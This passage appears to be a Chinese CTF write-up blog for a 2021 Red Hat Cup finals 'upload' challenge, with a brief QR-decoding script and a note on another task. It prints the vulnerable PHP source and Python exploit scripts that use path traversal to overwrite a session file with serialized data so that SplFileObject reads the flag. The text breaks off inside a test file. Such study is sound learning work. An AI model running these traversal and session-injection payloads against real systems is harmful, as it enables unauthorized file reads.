+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyzbar <span class="keyword">import</span> pyzbar</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fileListFunc</span>(<span class="params">filePath</span>):</span></span><br><span class="line">    fileList = []</span><br><span class="line">    <span class="keyword">for</span> top, dirs, nondirs <span class="keyword">in</span> os.walk(filePath):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> nondirs:</span><br><span class="line">            fileList.append(os.path.join(top, item))</span><br><span class="line">    <span class="keyword">return</span> fileList</span><br><span class="line"><span class="comment"># print(fileListFunc(&quot;./qcode&quot;))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fileListFunc(<span class="string">&quot;./qcode&quot;</span>):</span><br><span class="line">    qname = i.split(<span class="string">&quot;.png&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    img = Image.open(i)</span><br><span class="line">    txt_list = pyzbar.decode(img)</span><br><span class="line">    <span class="keyword">if</span> txt_list[<span class="number">0</span>][<span class="number">0</span>].decode() <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">        print(txt_list)</span><br></pre></td></tr></table></figure>
+
+<h3 id="binew"><a href="#binew" class="headerlink" title="binew"></a>binew</h3><p>提示apache 扩展 对比官方镜像发现多了个mod_manage</p>
+<p>读so文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_manage.so</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2021红帽杯-总决赛-upload"><a href="#2021红帽杯-总决赛-upload" class="headerlink" title="2021红帽杯-总决赛-upload"></a>2021红帽杯-总决赛-upload</h3><p>源码：</p>
+<p><strong>index.php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;class.php&#39;);</span><br><span class="line">if(!(isset($_SESSION[&#39;func&#39;]))) &#123;</span><br><span class="line">    $_SESSION[&#39;func&#39;] &#x3D; &#39;showfile&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(!(isset($_SESSION[&#39;files&#39;]))) &#123;</span><br><span class="line">    $_SESSION[&#39;files&#39;] &#x3D; array();</span><br><span class="line">&#125;</span><br><span class="line">if(!(isset($_SESSION[&#39;paths&#39;]))) &#123;</span><br><span class="line">    $_SESSION[&#39;paths&#39;] &#x3D; array();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;filename&#39;])&amp;&amp;isset($_POST[&#39;content&#39;]))&#123;</span><br><span class="line">    if(stristr($_POST[&#39;filename&#39;], &#39;h&#39;))&#123;</span><br><span class="line">        die(&#39;no h!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filepath &#x3D; &#39;.&#x2F;files&#x2F;&#39;.$_POST[&#39;filename&#39;];</span><br><span class="line">    $filename &#x3D; basename($_POST[&#39;filename&#39;]);</span><br><span class="line">    file_put_contents($filepath,$_POST[&#39;content&#39;]);</span><br><span class="line">    $_SESSION[&#39;files&#39;][$filename] &#x3D; $filepath;</span><br><span class="line">    $_SESSION[&#39;paths&#39;][$filepath] &#x3D; &#39;file&#39;;</span><br><span class="line">    header(&#39;Location:&#x2F;?file&#x3D;&#39;.$filename);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;upload&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;h3&gt;upload your file below&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;filename&quot; value&#x3D;&quot;filename&quot; style&#x3D;&quot;width: 600px;&quot;&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line">        &lt;textarea type&#x3D;&quot;text&quot; name&#x3D;&quot;content&quot; style&#x3D;&quot;width: 600px;height: 300px;&quot; &gt;&lt;&#x2F;textarea&gt;</span><br><span class="line">        &lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;h4&gt;beatiful front&lt;&#x2F;h4&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(rand(0,2)&gt;1)&#123;</span><br><span class="line">    $showfile &#x3D; &#39;red&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $showfile &#x3D;&#39;green&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$filelist &#x3D; array();</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">foreach ($_SESSION[&#39;paths&#39;] as $path&#x3D;&gt;$class)&#123;</span><br><span class="line">    $temp &#x3D; new $class($path);</span><br><span class="line">    if($class&#x3D;&#x3D;&#39;file&#39;)&#123;</span><br><span class="line">        $filelist[] &#x3D; (string)$temp;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $filelist[] &#x3D; $temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$out &#x3D; &#39;&lt;p&gt;your file:&#39;;</span><br><span class="line"></span><br><span class="line">foreach ($filelist as $value)&#123;</span><br><span class="line">    $out .&#x3D; $value.&#39; &#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo $out.&#39;&lt;&#x2F;p&gt;&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    if(isset($_SESSION[&#39;files&#39;][$_GET[&#39;file&#39;]])) &#123;</span><br><span class="line">        $pathinfo &#x3D; array($_GET[&#39;file&#39;]&#x3D;&gt;$_SESSION[&#39;files&#39;][$_GET[&#39;file&#39;]]);</span><br><span class="line">        $&#123;$_SESSION[&#39;func&#39;]&#125;($pathinfo);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#39;no such file!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>class.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">red</span>(<span class="params">$fileinfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($fileinfo <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        $path = $value;</span><br><span class="line">        $name = $key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a style=&#x27;color:#ff6347&#x27; href=&#x27;<span class="subst">$path</span>&#x27;&gt;<span class="subst">$name</span>&lt;/a&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">green</span>(<span class="params">$fileinfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($fileinfo <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        $path = $value;</span><br><span class="line">        $name = $key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a style=&#x27;color:#32cd32&#x27; href=&#x27;<span class="subst">$path</span>&#x27;&gt;<span class="subst">$name</span>&lt;/a&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;path = $path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>功能点主要有个文件写入，看了半年，才看出是修改SESSION文件 tcl</p>
+<p>这里可以利用原生类读文件，但是需要竞争</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;func&#x27;</span>] = <span class="string">&#x27;value&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;files&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;calc&#x27;</span>=&gt;<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line">$_SESSION[<span class="string">&#x27;paths&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;/flag.txt&#x27;</span>=&gt;<span class="string">&#x27;SplFileObject&#x27;</span>);</span><br><span class="line">$ser = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_SESSION <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $ser .= $key.<span class="string">&#x27;|&#x27;</span>.serialize($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $ser;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?file=calc</span></span><br></pre></td></tr></table></figure>
+
+<p>竞争脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request1</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://123.57.78.168:56047/?file=calc&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    r = requests.get(burp0_url, cookies=burp0_cookies)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request2</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://123.57.78.168:56047/index.php&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;</span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;../../../../../../../../../../../../../tmp/sess_moonback&quot;</span>, </span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&#x27;func|s:5:&quot;value&quot;;files|a:1:&#123;s:4:&quot;calc&quot;;s:4:&quot;calc&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=request1, args=()).start()</span><br><span class="line">    threading.Thread(target=request2, args=()).start()</span><br></pre></td></tr></table></figure>
+
+<p>后来发现根本不用竞争，因为写入的/flag和sess_moonback根本就不是一个文件 此时$filepath是不同的 就不会修改SplFileObject为file</p>
+<p><img src="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/image-20210725233613042.png" alt="image-20210725233613042"></p>
+<p>直接脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request1</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.132.128/?file=calc&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    r = requests.get(burp0_url, cookies=burp0_cookies)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request2</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://192.168.132.128/index.php&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;moonback&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;</span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;../../../../../../../../../../../../../var/lib/php/sessions/sess_moonback&quot;</span>, </span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&#x27;files|a:1:&#123;s:4:&quot;calc&quot;;s:4:&quot;calc&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(50):</span></span><br><span class="line"><span class="comment">#     threading.Thread(target=request1, args=()).start()</span></span><br><span class="line"><span class="comment">#     threading.Thread(target=request2, args=()).start()</span></span><br><span class="line">request2()</span><br><span class="line">request1()</span><br></pre></td></tr></table></figure>
+
+<p>生成序列化的脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $_SESSION[&#x27;func&#x27;] = &#x27;value&#x27;;</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;files&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;calc&#x27;</span>=&gt;<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line">$_SESSION[<span class="string">&#x27;paths&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&#x27;/flag&#x27;</span>=&gt;<span class="string">&#x27;SplFileObject&#x27;</span>);</span><br><span class="line">$ser = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($_SESSION <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $ser .= $key.<span class="string">&#x27;|&#x27;</span>.serialize($value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $ser;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?file=calc</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files|a:1:&#123;s:4:&quot;calc&quot;;s:4:&quot;calc&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>脚本运行一次之后的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func|s:8:&quot;showfile&quot;;files|a:1:&#123;s:13:&quot;sess_moonback&quot;;s:81:&quot;.&#x2F;files&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_moonback&quot;;&#125;paths|a:1:&#123;s:81:&quot;.&#x2F;files&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_moonback&quot;;s:4:&quot;file&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为啥没修改为要穿的文件呢？不懂。。。。</p>
+<p>运行第二次的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files|a:1:&#123;s:4:&quot;calc&quot;;s:4:&quot;calc&quot;;&#125;paths|a:1:&#123;s:5:&quot;&#x2F;flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;func|s:8:&quot;showfile&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>经测试，发现以下内容：</p>
+<ul>
+<li>在程序执行最后读取session文件发现内容实际已经修改</li>
+<li>应该是在session的第一次创建时 $_SESSION修改会在程序执行结束生效 即在结束才会写入文件为序列化后的内容</li>
+<li>$_SESSION实际就是程序执行开始读取文件反序列化 结束序列化写入文件</li>
+<li>第二次的时候下图根本就没设置成功原因是 $_SESSION是非实时的，即 $_SESSION还是第一次写入的结果，根本就没变化</li>
+<li>第三条 我增加了一个属性发现并不影响  可以证明$_SESSION的修改对session文件的写入是非实时的</li>
+</ul>
+<p>没设置成功</p>
+<p><img src="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/image-20210727002922364.png" alt="image-20210727002922364"></p>
+<p>这样文件内容并没有改变</p>
+<p><img src="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/image-20210727004452271.png" alt="image-20210727004452271"></p>
+<p>测试脚本及代码：</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;func&#x27;</span>]))) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;func&#x27;</span>] = <span class="string">&#x27;showfile&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;files&#x27;</span>]))) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;files&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;paths&#x27;</span>]))) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;paths&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;filename&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    $filepath = <span class="string">&#x27;./files/&#x27;</span>.$_POST[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filename = basename($_POST[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    var_dump(file_put_contents($filepath,$_POST[<span class="string">&#x27;content&#x27;</span>]));</span><br><span class="line">    var_dump(file_get_contents(<span class="string">&#x27;/var/lib/php/sessions/sess_moonback&#x27;</span>));</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;files&#x27;</span>][$filename] = $filepath;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;paths&#x27;</span>][$filepath] = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line">    var_dump(file_get_contents(<span class="string">&#x27;/var/lib/php/sessions/sess_moonback&#x27;</span>));</span><br><span class="line">    header(<span class="string">&#x27;Location:/?file=&#x27;</span>.$filename);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;h3&gt;upload your file below&lt;/h3&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;filename&quot;</span> value=<span class="string">&quot;filename&quot;</span> style=<span class="string">&quot;width: 600px;&quot;</span>&gt;</span><br><span class="line">        &lt;/br&gt;</span><br><span class="line">        &lt;/br&gt;</span><br><span class="line">        &lt;textarea type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;content&quot;</span> style=<span class="string">&quot;width: 600px;height: 300px;&quot;</span> &gt;&lt;/textarea&gt;</span><br><span class="line">        &lt;/br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h4&gt;beatiful front&lt;/h4&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(rand(<span class="number">0</span>,<span class="number">2</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">    $showfile = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $showfile =<span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//var_dump($_SESSION);</span></span><br><span class="line">$filelist = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> ($_SESSION[<span class="string">&#x27;paths&#x27;</span>] <span class="keyword">as</span> $path=&gt;$class)&#123;</span><br><span class="line">    $temp = <span class="keyword">new</span> $class($path);</span><br><span class="line">    <span class="keyword">if</span>($class==<span class="string">&#x27;file&#x27;</span>)&#123;</span><br><span class="line">        $filelist[] = (<span class="keyword">string</span>)$temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">       